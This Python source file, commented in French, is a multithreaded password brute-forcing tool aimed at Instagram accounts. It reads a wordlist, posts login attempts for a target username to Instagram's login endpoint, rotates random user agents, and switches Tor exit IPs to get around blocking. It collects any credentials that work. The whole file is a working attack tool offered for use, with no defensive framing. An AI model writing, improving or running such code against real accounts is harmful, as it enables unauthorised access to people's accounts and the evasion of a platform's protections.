import requests
import random
import time
from fake_useragent import UserAgent
from stem import Signal
from stem.control import Controller
from queue import Queue
import threading

class BruteForce:
    def __init__(self, username, wordlist):
        self.username = username
        self.wordlist = wordlist
        self.success = False
        self.valid_credentials = []
        self.ua = UserAgent()
        self.session = requests.Session()
        self.controller = None

    # Connexion à Tor pour changer d'IP
    def connect_to_tor(self):
        self.controller = Controller.from_port(port=9051)
        self.controller.authenticate()
        self.controller.signal(Signal.NEWNYM)

    # Fonction pour choisir un user-agent aléatoire
    def get_random_user_agent(self):
        return self.ua.random

    # Fonction pour envoyer les requêtes
    def try_login(self, password):
        headers = {
            'User-Agent': self.get_random_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        data = {
            'username': self.username,
            'password': password
        }
        url = 'https://www.instagram.com/accounts/login/ajax/'

        try:
            response = self.session.post(url, data=data, headers=headers, timeout=10)
            if response.status_code == 200:
                return True, response.json()
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la tentative: {e}")
        return False, None

    # Fonction pour gérer les erreurs de connexion et réessayer
    def handle_retry(self, password):
        # Si le code de réponse indique une erreur, on change d'IP
        success, response = self.try_login(password)
        if not success:
            self.connect_to_tor()
            success, response = self.try_login(password)
        return success, response

    # Fonction de brute-force en utilisant une queue pour les threads
    def attack(self, password_queue):
        while not password_queue.empty():
            password = password_queue.get()
            print(f"Tentative avec : {password}")
            success, response = self.handle_retry(password)

            if success and "authenticated" in response and response['authenticated']:
                print(f"Identifiants valides trouvés: {self.username}:{password}")
                self.valid_credentials.append(f"{self.username}:{password}")
                self.success = True
                break
            password_queue.task_done()

    # Démarrer l'attaque en utilisant plusieurs threads pour améliorer la vitesse
    def start_attack(self):
        if not self.success:
            passwords = self.load_wordlist()
            password_queue = Queue()
            for password in passwords:
                password_queue.put(password)

            threads = []
            for _ in range(10):  # Nombre de threads
                thread = threading.Thread(target=self.attack, args=(password_queue,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

        # Retourne les résultats
        if self.success:
            return {"status": "success", "message": "Identifiants valides trouvés", "valid_credentials": self.valid_credentials}
        else:
            return {"status": "failure", "message": "Aucun identifiant valide trouvé."}

    # Chargement de la wordlist
    def load_wordlist(self):
        try:
            with open(f'wordlists/{self.wordlist}.txt', 'r') as file:
                return [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            print(f"Erreur : Le fichier de wordlist {self.wordlist}.txt est introuvable.")
            return []
